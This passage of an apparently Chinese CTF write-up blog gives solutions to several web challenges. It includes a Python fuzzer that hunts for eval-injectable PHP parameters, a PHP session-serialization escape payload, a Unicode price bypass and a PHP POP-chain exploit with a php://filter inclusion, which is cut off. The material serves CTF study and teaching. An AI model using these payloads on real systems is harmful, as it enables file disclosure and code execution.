class="line">    # 更好看，同时可以对比不加线程和加线程的时间对比</span><br><span class="line">    print(&#39;trying   &#39;+file + &#39;     &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    with open(file, encoding&#x3D;&#39;utf-8&#39;) as f:  # 打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">        gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">        posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;  # 所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;  # 所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)  # 一次性请求所有的GET和POST</span><br><span class="line">    req.close()                                     # 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    # print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:  # 如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39; % a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()                                     # 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b: &quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()                                     # 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:  # flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; % param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()  # 对应于之前的多线程打开</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in files:  # 加入多线程</span><br><span class="line">    t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">    highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">    $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示传入phpinfo会有提示</p>


<p>发现疑似flag路径 d0g3_f1ag.php</p>
<h3 id="反序列化字符逃逸的两种方法：键值逃逸，键名逃逸"><a href="#反序列化字符逃逸的两种方法：键值逃逸，键名逃逸" class="headerlink" title="反序列化字符逃逸的两种方法：键值逃逸，键名逃逸"></a>反序列化字符逃逸的两种方法：键值逃逸，键名逃逸</h3><p>键名逃逸，先简化一下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line">$_SESSION[&quot;flagphp&quot;] &#x3D; &#39;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&#39;;</span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">$_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#x2F;&#x2F; &#125;else&#123;</span><br><span class="line">&#x2F;&#x2F;     $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line">echo $serialize_info;</span><br></pre></td></tr></table></figure>

<p>extract($_POST);这个函数就很有意思，他占在这里的位置就代表了这题的考点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br><span class="line"></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure>

<p>通俗一点讲就是我们post传入的值进行赋值，然后加入了我们的Session大家庭，加入一个键值对，并且这个值是在img之前加入的</p>
<p>那么我们先看看如何进行逃逸，首先是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们出现黑名单中的内容的时候就会将其用抹除即不用占字节，那么配合上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>

<p>我们先看看顺序首先进行我们的序列化，然后进行我们的内容正则，是否可能会存在逃逸呢</p>
<p>我们首先传入一个正常的键值对$_SESSION[“here”]=”here”;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;here&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;here&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现img的值就在其中，如果我们能形成闭合进行伪造就能逃逸，比如我们的here键名换成黑名单内容$_SESSION[“flag”]=”here”;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:4:&quot;&quot;;s:4:&quot;here&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>发现此时存在一个bug s:4:””;s:4:”，那么此时的闭合是s:4””;s:后面的就出现了Bug，那么如果我们多加点黑名单的元素是否可以进行完美的闭合呢$_SESSION[“flagphp”]=”here”;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:7:&quot;&quot;;s:4:&quot;here&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>此时闭合为s:7:””;s:4:”发现多闭合了 一个双引号，但没关系，我们此时先关心下后面的内容，因为前面的闭合我们可以控制，但需要知道下一个s的长度</p>
<p>伪造img</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先闭合后我们要对刚刚闭合的键进行值的赋予随便写个;s:1:&quot;x&quot;；</span><br><span class="line">接下来伪造Img</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;	是构造文件包含的重要部分</span><br><span class="line">最后结果</span><br><span class="line"></span><br><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>尝试一下</p>


<p>修改下base64的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;06340825-8f2f-4694-a2e5-c705791532a8.node4.buuoj.cn:81&#x2F;index.php?f&#x3D;show_image</span><br><span class="line">POST</span><br><span class="line">_SESSION[flagphp]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>发现唯一的输入框内容，不能够购买商品</p>


<p>并且发现输入的price长度超过1会有不同回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only one char(?) allowed!</span><br></pre></td></tr></table></figure>

<p>只允许一个字符，那我们要怎么买第四个1337的东西，所以需要找到一个字符能大于1337</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;4&amp;price&#x3D;%E2%86%82</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UTF-8 Encoding:	0xE2 0x86 0x82</span><br><span class="line">将0x变成%</span><br><span class="line">它的utf-8编码是0xE2 0x86 0x82</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>发现源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in flag.php</span><br><span class="line">&#x2F;&#x2F;WTF IS THIS?</span><br><span class="line">&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">&#x2F;&#x2F;And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function &#x3D; $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复习下pop链的魔术方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)</span><br><span class="line">__construct(类一执行就开始调用，其作用是拿来初始化一些值。)</span><br><span class="line">__toString(在对象当做字符串的时候会被调用。)</span><br><span class="line">__wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)</span><br><span class="line">__sleep(在对象被序列化的过程中自动调用。sleep要加数组)</span><br><span class="line">__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</span><br><span class="line">__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)</span><br><span class="line">__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)</span><br><span class="line">__call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)</span><br><span class="line">__isset(方法用于检测私有属性值是否被设定。当外部使用isset读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)</span><br><span class="line">__unset(方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset魔术方法)</span><br></pre></td></tr></table></figure>

<p>那么我们来构造分析下pop链条</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先分析入口和出口</span><br><span class="line">Modifier里面有个文件包含可以作为最终的出口</span><br><span class="line">Modifier中</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">如果触发了_invoke那么就可以调用apend来触发文件包含并且我们的只要修改var值即可</span><br></pre></td></tr></table></figure>

<p>但如果只是修改var值，发现无法成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:58:&quot;file:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们就需要思考，我们没有触发_invoke，并且我们的var是protected值</p>
<p>在Show类中的_get方法找到一个调用函数的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; public function __toString()&#123;</span><br><span class="line"> &#x2F;&#x2F;     return $this-&gt;str-&gt;source;</span><br><span class="line"> &#x2F;&#x2F; &#125;</span><br></pre></td></tr></table></figure>

<p>那么我们此时就需要利用这个Test去访问我们的Modifier来触发Test的_get方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">出口</span><br><span class="line">进入Modifier的_invoke方法，调用append方法中的Include</span><br><span class="line">通过Test中的_get，调用Test-&gt;p来触发_invoke</span><br><span class="line">通过Show中的_toString通过将str设置为Test调用不存在的属性触发_get魔术方法</span><br><span class="line">通过Show中的_wakeup的正则匹配，触发source的_toString</span><br><span class="line">入口</span><br><span class="line"></span><br><span class="line">形成调用链：</span><br><span class="line">Show-&gt;__wakeup()(preg_match把对象当作字符串触发)-&gt;__toString()(使类中的source为Test对象，输出不存在的对象触发)-&gt;Test-&gt;__get()方法-&gt;Modifier-&gt;__invoke()(调用对象以函数的形式触发)-&gt;append()-&gt;include(文件包含，包含flag)</span><br></pre></td></tr></table></figure>

<h3 id="TIPS-4"><a href="#TIPS-4" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为Modifier类中的属性var为protected，将序列化后结果进行URL编码后可省略考虑不可见字符直接复制而丢失</span><br><span class="line">因此序列化后的内容进行urlencode编码</span><br></pre></td></tr></table></figure>

<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function &#x3D; $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">&#x2F;&#x2F;     @unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line">&#x2F;&#x2F; else&#123;</span><br><span class="line">&#x2F;&#x2F;     $a&#x3D;new Show;</span><br><span class="line">&#x2F;&#x2F;     highlight_file(__FILE__);</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line">$a &#x3D;new Modifier();</span><br><span class="line">$b &#x3D;new Show();</span><br><span class="line">$c &#x3D;new Test();</span><br><span class="line">$c-&gt;p &#x3D; $a;</span><br><span class="line">$b-&gt;source &#x3D; $b;</span><br><span class="line">$b-&gt;str &#x3D; $c;</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $a &#x3D; new Modifier();</span><br><span class="line">&#x2F;&#x2F; $b &#x3D; new Show();</span><br><span class="line">&#x2F;&#x2F; $c &#x3D; new Test();</span><br><span class="line">&#x2F;&#x2F; $c-&gt;p &#x3D; $a;</span><br><span class="line">&#x2F;&#x2F; $b-&gt;source &#x3D; new Show();</span><br><span class="line">&#x2F;&#x2F; $b-&gt;source-&gt;str &#x3D; $c;</span><br><span class="line">&#x2F;&#x2F; echo urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $a &#x3D; new 